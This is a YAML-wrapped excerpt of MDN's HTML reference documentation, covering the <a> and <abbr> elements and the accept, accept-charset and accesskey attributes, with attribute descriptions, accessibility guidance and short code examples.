---
name: HTML
slug: html
text_format: markdown
generator: src:devdocs
version: null
copyright: |-
  © 2005–2023 MDN contributors.
  Licensed under the Creative Commons Attribution-ShareAlike License v2.5
  or later.
  https://developer.mozilla.org/en-US/docs/Web/HTML
homepage: https://developer.mozilla.org/en-US/docs/Web/HTML

---
- name: a
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<a\\>: The Anchor element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fa&level=high)\n\nThe `<a>` [HTML](../index) element (or *anchor* element), with [its `href` attribute](#href), creates a hyperlink to web pages, files, email addresses, locations in the same page, or anything else a URL can address.\n\nContent within each `<a>` *should* indicate the link's destination. If the `href` attribute is present, pressing the enter key while focused on the `<a>` element will activate it.\n\n## Try it\n\n#### HTML Demo: \\<a\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>You can reach Michael at:</p>\n\n    <ul>\n      <li><a href=\"https://example.com\">Website</a></li>\n      <li><a href=\"mailto:m.bluth@example.com\">Email</a></li>\n      <li><a href=\"tel:+123456789\">Phone</a></li>\n    </ul>\n\n    li {\n      margin-bottom: 0.5rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`attributionsrc`](#attributionsrc) Experimental  \nSpecifies that you want the browser to send an [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header. On the server-side this is used to trigger sending an [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) header in the response, to register a [navigation-based attribution source](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API/Registering_sources#navigation-based_attribution_sources).\n\nThe browser stores the source data associated with the navigation-based attribution source (as provided in the [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) response header) when the user clicks the link. See the [Attribution Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API) for more details.\n\nThere are two versions of this attribute that you can set:\n\n- Boolean, i.e. just the `attributionsrc` name. This specifies that you want the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header sent to the same server as the `href` attribute points to. This is fine when you are handling the attribution source registration on the same server.\n- Value containing one or more URLs, for example:\n  html\n\n  ```\n  attributionsrc=\"https://a.example/register-source\n  https://b.example/register-source\"\n  ```\n\n  This is useful in cases where the requested resource is not on a server you control, or you just want to handle registering the attribution source on a different server. In this case, you can specify one or more URLs as the value of `attributionsrc`. When the resource request occurs, the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header will be sent to the URL(s) specified in `attributionsrc` in addition to the resource origin. These URLs can then respond with the [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) to complete registration.\n  **Note:** Specifying multiple URLs means that multiple attribution sources can be registered on the same feature. You might for example have different campaigns that you are trying to measure the success of, which involve generating different reports on different data.\n\n`<a>` elements cannot be used as attribution triggers, only sources.\n\n[`download`](#download)  \nCauses the browser to treat the linked URL as a download. Can be used with or without a `filename` value:\n\n- Without a value, the browser will suggest a filename/extension, generated from various sources:\n  - The [`Content-Disposition`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) HTTP header\n  - The final segment in the URL [path](https://developer.mozilla.org/en-US/docs/Web/API/URL/pathname)\n  - The [media type](https://developer.mozilla.org/en-US/docs/Glossary/MIME_type) (from the [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) header, the start of a [`data:` URL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs), or [`Blob.type`](https://developer.mozilla.org/en-US/docs/Web/API/Blob/type) for a [`blob:` URL](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static))\n- `filename`: defining a value suggests it as the filename. `/` and `\\` characters are converted to underscores (`_`). Filesystems may forbid other characters in filenames, so browsers will adjust the suggested name if necessary.\n\n**Note:**\n\n- `download` only works for [same-origin URLs](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), or the `blob:` and `data:` schemes.\n- How browsers treat downloads varies by browser, user settings, and other factors. The user may be prompted before a download starts, or the file may be saved automatically, or it may open automatically, either in an external application or in the browser itself.\n- If the `Content-Disposition` header has different information from the `download` attribute, resulting behavior may differ:\n  - If the header specifies a `filename`, it takes priority over a filename specified in the `download` attribute.\n  - If the header specifies a disposition of `inline`, Chrome and Firefox prioritize the attribute and treat it as a download. Old Firefox versions (before 82) prioritize the header and will display the content inline.\n\n[`href`](#href)  \nThe URL that the hyperlink points to. Links are not restricted to HTTP-based URLs — they can use any URL scheme supported by browsers:\n\n- Sections of a page with document fragments\n- Specific text portions with [text fragments](https://developer.mozilla.org/en-US/docs/Web/Text_fragments)\n- Pieces of media files with media fragments\n- Telephone numbers with `tel:` URLs\n- Email addresses with `mailto:` URLs\n- SMS text messages with `sms:` URLs\n- While web browsers may not support other URL schemes, websites can with [`registerProtocolHandler()`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler)\n\n[`hreflang`](#hreflang)  \nHints at the human language of the linked URL. No built-in functionality. Allowed values are the same as [the global `lang` attribute](../global_attributes/lang).\n\n[`ping`](#ping)  \nA space-separated list of URLs. When the link is followed, the browser will send [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) requests with the body `PING` to the URLs. Typically for tracking.\n\n[`referrerpolicy`](#referrerpolicy)  \nHow much of the [referrer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) to send when following the link.\n\n- `no-referrer`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n- `no-referrer-when-downgrade`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent to [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin)s without [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) ([HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS)).\n- `origin`: The sent referrer will be limited to the origin of the referring page: its [scheme](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), [host](https://developer.mozilla.org/en-US/docs/Glossary/Host), and [port](https://developer.mozilla.org/en-US/docs/Glossary/Port).\n- `origin-when-cross-origin`: The referrer sent to other origins will be limited to the scheme, the host, and the port. Navigations on the same origin will still include the path.\n- `same-origin`: A referrer will be sent for [same origin](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy), but cross-origin requests will contain no referrer information.\n- `strict-origin`: Only send the origin of the document as the referrer when the protocol security level stays the same (HTTPS→HTTPS), but don't send it to a less secure destination (HTTPS→HTTP).\n- `strict-origin-when-cross-origin` (default): Send a full URL when performing a same-origin request, only send the origin when the protocol security level stays the same (HTTPS→HTTPS), and send no header to a less secure destination (HTTPS→HTTP).\n- `unsafe-url`: The referrer will include the origin *and* the path (but not the [fragment](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/hash), [password](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/password), or [username](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/username)). **This value is unsafe**, because it leaks origins and paths from TLS-protected resources to insecure origins.\n\n[`rel`](../attributes/rel)  \nThe relationship of the linked URL as space-separated link types.\n\n[`target`](#target)  \nWhere to display the linked URL, as the name for a *browsing context* (a tab, window, or [`<iframe>`](iframe)). The following keywords have special meanings for where to load the URL:\n\n- `_self`: The current browsing context. (Default)\n- `_blank`: Usually a new tab, but users can configure browsers to open a new window instead.\n- `_parent`: The parent browsing context of the current one. If no parent, behaves as `_self`.\n- `_top`: The topmost browsing context. To be specific, this means the \"highest\" context that's an ancestor of the current one. If no ancestors, behaves as `_self`.\n- `_unfencedTop`: Allows embedded [fenced frames](https://developer.mozilla.org/en-US/docs/Web/API/Fenced_frame_API) to navigate the top-level frame (i.e. traversing beyond the root of the fenced frame, unlike other reserved destinations). Note that the navigation will still succeed if this is used outside of a fenced frame context, but it will not act like a reserved keyword.\n\n**Note:** Setting `target=\"_blank\"` on `<a>` elements implicitly provides the same `rel` behavior as setting [`rel=\"noopener\"`](../attributes/rel/noopener) which does not set `window.opener`.\n\n[`type`](#type)  \nHints at the linked URL's format with a [MIME type](https://developer.mozilla.org/en-US/docs/Glossary/MIME_type). No built-in functionality.\n\n### Deprecated attributes\n\n[`charset`](#charset) Deprecated  \nHinted at the [character encoding](https://developer.mozilla.org/en-US/docs/Glossary/Character_encoding) of the linked URL.\n\n**Note:** This attribute is deprecated and **should not be used by authors**. Use the HTTP [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) header on the linked URL.\n\n[`coords`](#coords) Deprecated  \nUsed with [the `shape` attribute](#shape). A comma-separated list of coordinates.\n\n[`name`](#name) Deprecated  \nWas required to define a possible target location in a page. In HTML 4.01, `id` and `name` could both be used on `<a>`, as long as they had identical values.\n\n**Note:** Use the global attribute [`id`](../global_attributes#id) instead.\n\n[`rev`](#rev) Deprecated  \nSpecified a reverse link; the opposite of [the `rel` attribute](#rel). Deprecated for being very confusing.\n\n[`shape`](#shape) Deprecated  \nThe shape of the hyperlink's region in an image map.\n\n**Note:** Use the [`<area>`](area) element for image maps instead.\n\n## Accessibility\n\n### Strong link text\n\n**The content inside a link should indicate where the link goes**, even out of context.\n\n#### Inaccessible, weak link text\n\nA sadly common mistake is to only link the words \"click here\" or \"here\":\n\nhtml\n\n```\n<p>Learn more about our products <a href=\"/products\">here</a>.</p>\n```\n\n##### Result\n\n#### Strong link text\n\nLuckily, this is an easy fix, and it's actually shorter than the inaccessible version!\n\nhtml\n\n```\n<p>Learn more <a href=\"/products\">about our products</a>.</p>\n```\n\n##### Result\n\nAssistive software has shortcuts to list all links on a page. However, strong link text benefits all users — the \"list all links\" shortcut emulates how sighted users quickly scan pages.\n\n### onclick events\n\nAnchor elements are often abused as fake buttons by setting their `href` to `#` or `javascript:void(0)` to prevent the page from refreshing, then listening for their `click` events .\n\nThese bogus `href` values cause unexpected behavior when copying/dragging links, opening links in a new tab/window, bookmarking, or when JavaScript is loading, errors, or is disabled. They also convey incorrect semantics to assistive technologies, like screen readers.\n\nUse a [`<button>`](button) instead. In general, **you should only use a hyperlink for navigation to a real URL**.\n\n### External links and linking to non-HTML resources\n\nLinks that open in a new tab/window via `target=\"_blank\"`, or links that point to a download file should indicate what will happen when the link is followed.\n\nPeople experiencing low vision conditions, navigating with the aid of screen reading technology, or with cognitive concerns may be confused when a new tab, window, or application opens unexpectedly. Older screen-reading software may not even announce the behavior.\n\n#### Link that opens a new tab/window\n\nhtml\n\n```\n<a target=\"_blank\" href=\"https://www.wikipedia.org\">\n  Wikipedia (opens in new tab)\n</a>\n```\n\n##### Result\n\n#### Link to a non-HTML resource\n\nhtml\n\n```\n<a href=\"2017-annual-report.ppt\">2017 Annual Report (PowerPoint)</a>\n```\n\nIf an icon is used to signify link behavior, make sure it has an [*alt text*](img#alt):\n\nhtml\n\n```\n<a target=\"_blank\" href=\"https://www.wikipedia.org\">\n  Wikipedia\n  <img alt=\"(opens in new tab)\" src=\"newtab.svg\" />\n</a>\n\n<a href=\"2017-annual-report.ppt\">\n  2017 Annual Report\n  <img alt=\"(PowerPoint file)\" src=\"ppt-icon.svg\" />\n</a>\n```\n\n##### Result\n\n- [WebAIM: Links and Hypertext - Hypertext Links](https://webaim.org/techniques/hypertext/hypertext_links)\n- [MDN / Understanding WCAG, Guideline 3.2](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Understandable#guideline_3.2_%E2%80%94_predictable_make_web_pages_appear_and_operate_in_predictable_ways)\n- [G200: Opening new windows and tabs from a link only when necessary](https://www.w3.org/TR/WCAG20-TECHS/G200.html)\n- [G201: Giving users advanced warning when opening a new window](https://www.w3.org/TR/WCAG20-TECHS/G201.html)\n\n### Skip links\n\nA **skip link** is a link placed as early as possible in [`<body>`](body) content that points to the beginning of the page's main content. Usually, CSS hides a skip link offscreen until focused.\n\nhtml\n\n```\n<body>\n  <a href=\"#content\" class=\"skip-link\">Skip to main content</a>\n\n  <header>…</header>\n\n  <!-- The skip link jumps to here -->\n  <main id=\"content\"></main>\n</body>\n```\n\ncss\n\n```\n.skip-link {\n  position: absolute;\n  top: -3em;\n  background: #fff;\n}\n.skip-link:focus {\n  top: 0;\n}\n```\n\n#### Result\n\nSkip links let keyboard users bypass content repeated throughout multiple pages, such as header navigation.\n\nSkip links are especially useful for people who navigate with the aid of assistive technology such as switch control, voice command, or mouth sticks/head wands, where the act of moving through repetitive links can be laborious.\n\n- [WebAIM: \"Skip Navigation\" Links](https://webaim.org/techniques/skipnav/)\n- [How-to: Use Skip Navigation links](https://www.a11yproject.com/posts/skip-nav-links/)\n- [MDN / Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%e2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n\n### Size and proximity\n\n#### Size\n\nInteractive elements, like links, should provide an area large enough that it is easy to activate them. This helps a variety of people, including those with motor control issues and those using imprecise inputs such as a touchscreen. A minimum size of 44×44 [CSS pixels](https://www.w3.org/TR/WCAG21/#dfn-css-pixels) is recommended.\n\nText-only links in prose content are exempt from this requirement, but it's still a good idea to make sure enough text is hyperlinked to be easily activated.\n\n- [Understanding Success Criterion 2.5.5: Target Size](https://www.w3.org/WAI/WCAG21/Understanding/target-size.html)\n- [Target Size and 2.5.5](https://adrianroselli.com/2019/06/target-size-and-2-5-5.html)\n- [Quick test: Large touch targets](https://www.a11yproject.com/posts/large-touch-targets/)\n\n#### Proximity\n\nInteractive elements, like links, placed in close visual proximity should have space separating them. Spacing helps people with motor control issues, who may otherwise accidentally activate the wrong interactive content.\n\nSpacing may be created using CSS properties like [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin).\n\n- [Hand tremors and the giant-button-problem](https://axesslab.com/hand-tremors/)\n\n## Examples\n\n### Linking to an absolute URL\n\n#### HTML\n\nhtml\n\n```\n<a href=\"https://www.mozilla.com\">Mozilla</a>\n```\n\n#### Result\n\n### Linking to relative URLs\n\n#### HTML\n\nhtml\n\n```\n<a href=\"//example.com\">Scheme-relative URL</a>\n<a href=\"/en-US/docs/Web/HTML\">Origin-relative URL</a>\n<a href=\"p\">Directory-relative URL</a>\n<a href=\"./p\">Directory-relative URL</a>\n<a href=\"../p\">Parent-directory-relative URL</a>\n```\n\n#### Result\n\n### Linking to an element on the same page\n\nhtml\n\n```\n<!-- <a> element links to the section below -->\n<p><a href=\"#Section_further_down\">Jump to the heading below</a></p>\n\n<!-- Heading to link to -->\n<h2 id=\"Section_further_down\">Section further down</h2>\n```\n\n#### Result\n\n**Note:** You can use `href=\"#top\"` or the empty fragment (`href=\"#\"`) to link to the top of the current page, [as defined in the HTML specification](https://html.spec.whatwg.org/multipage/browsing-the-web.html#scroll-to-the-fragment-identifier).\n\n### Linking to an email address\n\nTo create links that open in the user's email program to let them send a new message, use the `mailto:` scheme:\n\nhtml\n\n```\n<a href=\"mailto:nowhere@mozilla.org\">Send email to nowhere</a>\n```\n\n#### Result\n\nFor details about `mailto:` URLs, such as including a subject or body, see [Email links](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks#email_links) or [RFC 6068](https://datatracker.ietf.org/doc/html/rfc6068).\n\n### Linking to telephone numbers\n\nhtml\n\n```\n<a href=\"tel:+49.157.0156\">+49 157 0156</a>\n<a href=\"tel:+1(800)555-0123\">(800) 555-0123</a>\n```\n\n#### Result\n\n`tel:` link behavior varies with device capabilities:\n\n- Cellular devices autodial the number.\n- Most operating systems have programs that can make calls, like Skype or FaceTime.\n- Websites can make phone calls with [`registerProtocolHandler`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler), such as `web.skype.com`.\n- Other behaviors include saving the number to contacts, or sending the number to another device.\n\nSee [RFC 3966](https://datatracker.ietf.org/doc/html/rfc3966) for syntax, additional features, and other details about the `tel:` URL scheme.\n\n### Using the download attribute to save a \\<canvas\\> as a PNG\n\nTo save a [`<canvas>`](canvas) element's contents as an image, you can create a link where the `href` is the canvas data as a `data:` URL created with JavaScript and the `download` attribute provides the file name for the downloaded PNG file:\n\n#### Example painting app with save link\n\n##### HTML\n\nhtml\n\n```\n<p>\n  Paint by holding down the mouse button and moving it.\n  <a href=\"\" download=\"my_painting.png\">Download my painting</a>\n</p>\n\n<canvas width=\"300\" height=\"300\"></canvas>\n```\n\n##### CSS\n\ncss\n\n```\nhtml {\n  font-family: sans-serif;\n}\ncanvas {\n  background: #fff;\n  border: 1px dashed;\n}\na {\n  display: inline-block;\n  background: #69c;\n  color: #fff;\n  padding: 5px 10px;\n}\n```\n\n##### JavaScript\n\njs\n\n```\nconst canvas = document.querySelector(\"canvas\");\nconst c = canvas.getContext(\"2d\");\nc.fillStyle = \"hotpink\";\nlet isDrawing;\n\nfunction draw(x, y) {\n  if (isDrawing) {\n    c.beginPath();\n    c.arc(x, y, 10, 0, Math.PI * 2);\n    c.closePath();\n    c.fill();\n  }\n}\n\ncanvas.addEventListener(\"mousemove\", (event) =>\n  draw(event.offsetX, event.offsetY),\n);\ncanvas.addEventListener(\"mousedown\", () => (isDrawing = true));\ncanvas.addEventListener(\"mouseup\", () => (isDrawing = false));\n\ndocument\n  .querySelector(\"a\")\n  .addEventListener(\n    \"click\",\n    (event) => (event.target.href = canvas.toDataURL()),\n  );\n```\n\n##### Result\n\n## Security and privacy\n\n`<a>` elements can have consequences for users' security and privacy. See [`Referer` header: privacy and security concerns](https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns) for information.\n\nUsing `target=\"_blank\"` without [`rel=\"noreferrer\"`](../attributes/rel/noreferrer) and [`rel=\"noopener\"`](../attributes/rel/noopener) makes the website vulnerable to [`window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) API exploitation attacks, although note that, in newer browser versions setting `target=\"_blank\"` implicitly provides the same protection as setting `rel=\"noopener\"`. See [browser compatibility](#browser_compatibility) for details.\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<link>`](link) is similar to `<a>`, but for metadata hyperlinks that are invisible to users.\n- [`:link`](https://developer.mozilla.org/en-US/docs/Web/CSS/:link) is a CSS pseudo-class that will match `<a>` elements with URL in `href` attribute that was not yet visited by the user.\n- [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) is a CSS pseudo-class that will match `<a>` elements with URL in `href` attribute that was visited by the user in the past.\n- [`:any-link`](https://developer.mozilla.org/en-US/docs/Web/CSS/:any-link) is a CSS pseudo-class that will match `<a>` elements with `href` attribute.\n- [Text fragments](https://developer.mozilla.org/en-US/docs/Web/Text_fragments) are user-agent instructions added to URLs that allow content authors to link to specific text on a page, without IDs being required.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a)"
- name: abbr
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<abbr\\>: The Abbreviation element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fabbr&level=high)\n\nThe `<abbr>` [HTML](../index) element represents an abbreviation or acronym.\n\nWhen including an abbreviation or acronym, provide a full expansion of the term in plain text on first use, along with the `<abbr>` to mark up the abbreviation. This informs the user what the abbreviation or acronym means.\n\nThe optional [`title`](../global_attributes#title) attribute can provide an expansion for the abbreviation or acronym when a full expansion is not present. This provides a hint to user agents on how to announce/display the content while informing all users what the abbreviation means. If present, `title` must contain this full description and nothing else.\n\n## Try it\n\n#### HTML Demo: \\<abbr\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      You can use <abbr>CSS</abbr> (Cascading Style Sheets) to style your <abbr>HTML</abbr> (HyperText Markup Language).\n      Using style sheets, you can keep your <abbr>CSS</abbr> presentation layer and <abbr>HTML</abbr> content layer\n      separate. This is called \"separation of concerns.\"\n    </p>\n\n    abbr {\n      font-style: italic;\n      color: chocolate;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only supports the [global attributes](../global_attributes). The [`title`](../global_attributes#title) attribute has a specific semantic meaning when used with the `<abbr>` element; it *must* contain a full human-readable description or expansion of the abbreviation. This text is often presented by browsers as a tooltip when the mouse cursor is hovered over the element.\n\nEach `<abbr>` element you use is independent of all others; providing a `title` for one does not automatically attach the same expansion text to others with the same content text.\n\n## Usage notes\n\n### Typical use cases\n\nIt's certainly not required that all abbreviations be marked up using `<abbr>`. There are, though, a few cases where it's helpful to do so:\n\n- When an abbreviation is used and you want to provide an expansion or definition outside the flow of the document's content, use `<abbr>` with an appropriate [`title`](../global_attributes#title).\n- To define an abbreviation which may be unfamiliar to the reader, present the term using `<abbr>` and inline text providing the definition. Include a `title` attribute only when the inline expansion or definition is not available.\n- When an abbreviation's presence in the text needs to be semantically noted, the `<abbr>` element is useful. This can be used, in turn, for styling or scripting purposes.\n- You can use `<abbr>` in concert with [`<dfn>`](dfn) to establish definitions for terms which are abbreviations or acronyms. See the example [Defining an abbreviation](#defining_an_abbreviation) below.\n\n### Grammar considerations\n\nIn languages with [grammatical number](https://en.wikipedia.org/wiki/Grammatical_number) (that is, languages where the number of items affects the grammar of a sentence), use the same grammatical number in your `title` attribute as inside your `<abbr>` element. This is especially important in languages with more than two numbers, such as Arabic, but is also relevant in English.\n\n## Default styling\n\nThe purpose of this element is purely for the convenience of the author and all browsers display it inline ([`display: inline`](https://developer.mozilla.org/en-US/docs/Web/CSS/display)) by default, though its default styling varies from one browser to another:\n\nSome browsers add a dotted underline to the content of the element. Others add a dotted underline while converting the contents to small caps. Others may not style it differently than a [`<span>`](span) element. To control this styling, use [`text-decoration`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration) and [`font-variant`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant).\n\n## Accessibility\n\nSpelling out the acronym or abbreviation in full the first time it is used on a page is beneficial for helping people understand it, especially if the content is technical or industry jargon.\n\nOnly include a `title` if expanding the abbreviation or acronym in the text is not possible. Having a difference between the announced word or phrase and what is displayed on the screen, especially if it's technical jargon the reader may not be familiar with, can be jarring.\n\nhtml\n\n```\n<p>\n  JavaScript Object Notation (<abbr>JSON</abbr>) is a lightweight\n  data-interchange format.\n</p>\n```\n\nThis is especially helpful for people who are unfamiliar with the terminology or concepts discussed in the content, people who are new to the language, and people with cognitive concerns.\n\n## Examples\n\n### Marking up an abbreviation semantically\n\nTo mark up an abbreviation without providing an expansion or description, use `<abbr>` without any attributes, as seen in this example.\n\n#### HTML\n\nhtml\n\n```\n<p>Using <abbr>HTML</abbr> is fun and easy!</p>\n```\n\n#### Result\n\n### Styling abbreviations\n\nYou can use CSS to set a custom style to be used for abbreviations, as seen in this simple example.\n\n#### HTML\n\nhtml\n\n```\n<p>Using <abbr>CSS</abbr>, you can style your abbreviations!</p>\n```\n\n#### CSS\n\ncss\n\n```\nabbr {\n  font-variant: all-small-caps;\n}\n```\n\n#### Result\n\n### Providing an expansion\n\nAdding a [`title`](../global_attributes#title) attribute lets you provide an expansion or definition for the abbreviation or acronym.\n\n#### HTML\n\nhtml\n\n```\n<p>Ashok's joke made me <abbr title=\"Laugh Out Loud\">LOL</abbr> big time.</p>\n```\n\n#### Result\n\n### Defining an abbreviation\n\nYou can use `<abbr>` in tandem with [`<dfn>`](dfn) to more formally define an abbreviation, as shown here.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  <dfn id=\"html\"><abbr title=\"HyperText Markup Language\">HTML</abbr> </dfn> is a\n  markup language used to create the semantics and structure of a web page.\n</p>\n\n<p>\n  A <dfn id=\"spec\">Specification</dfn> (<abbr>spec</abbr>) is a document that\n  outlines in detail how a technology or API is intended to function and how it\n  is accessed.\n</p>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                  |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content)                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                            |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content)                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                              |\n| Permitted ARIA roles                        | Any                                                                                                                              |\n| DOM Interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Using the `<abbr>` element](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Advanced_text_formatting#abbreviations)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/abbr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/abbr)"
- name: accept (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`accept`](attributes/accept)

    [`<form>`](element/form), [`<input>`](element/input)

    List of types the server accepts, typically a file type.
- name: accept-charset (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`accept-charset`](element/form#accept-charset)

    [`<form>`](element/form)

    List of supported charsets.
- name: accesskey (attribute)
  summary: The accesskey global attribute provides a hint for generating a keyboard shortcut for the current element
  description: "# accesskey\n\nThe `accesskey` [global attribute](../global_attributes) provides a hint for generating a keyboard shortcut for the current element. The attribute value must consist of a single printable character (which includes accented and other characters that can be generated by the keyboard).\n\n## Try it\n\n#### HTML Demo: accesskey\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      If you need to relax, press the <strong><u>S</u></strong\n      >tress reliever!\n    </p>\n\n    <button accesskey=\"s\">Stress reliever</button>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** In the WHATWG spec, it says you can specify multiple space-separated characters, and the browser will use the first one it supports. However, this does not work in most browsers. IE/Edge uses the first one it supports without problems, provided there are no conflicts with other commands.\n\nThe way to activate the accesskey depends on the browser and its platform:\n\n[TABLE]\n\n## Accessibility concerns\n\nIn addition to poor browser support, there are numerous concerns with the `accesskey` attribute:\n\n- An `accesskey` value can conflict with a system or browser keyboard shortcut, or assistive technology functionality. What may work for one combination of operating system, assistive technology, and browser may not work with other combinations.\n- Certain `accesskey` values may not be present on certain keyboards, especially when internationalization is a concern. So adapting to specific languages could cause further problems.\n- `accesskey` values that rely on numbers may be confusing to individuals experiencing cognitive concerns, where the number doesn't have a logical association with the functionality it triggers.\n- Informing the user that `accesskey`s are present, so that they are aware of the functionality. If the system lacks a method of notifying the user about this feature, the user might accidentally activate `accesskey`s.\n\nBecause of these issues, it is generally advised not to use `accesskey`s for most general-purpose websites and web apps.\n\n- [WebAIM: Keyboard Accessibility - Accesskey](https://webaim.org/techniques/keyboard/accesskey#spec)\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `accesskey` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`HTMLElement.accessKey`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/accessKey)\n- [`HTMLElement.accessKeyLabel`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/accessKeyLabel)\n- All [global attributes](../global_attributes).\n- 